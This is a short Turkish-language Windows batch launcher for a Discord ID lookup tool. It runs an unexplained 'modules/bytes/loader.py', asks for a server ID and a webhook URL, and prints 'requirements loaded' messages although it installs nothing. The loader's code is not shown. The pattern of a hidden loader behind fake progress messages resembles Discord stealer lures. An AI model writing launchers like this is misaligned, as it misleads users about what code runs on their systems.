@echo off
title Satan Discord ID Sorgu
cls
color 0A

echo.
echo  ============================================
echo       Satan Discord ID Sorgu
echo  ============================================
echo.

python modules/bytes/loader.py

set /p SERVER_ID= Sunucu ID'sini girin: 
echo.

set /p WEBHOOK_URL= Webhook URL'sini girin: 
echo.

echo Gereksinimler yukleniyor...

echo.
echo Gereksinimler yüklendi. Start.bat dosyası ile botu çalıştırın!
echo.

timeout /t 8 >nul
exit
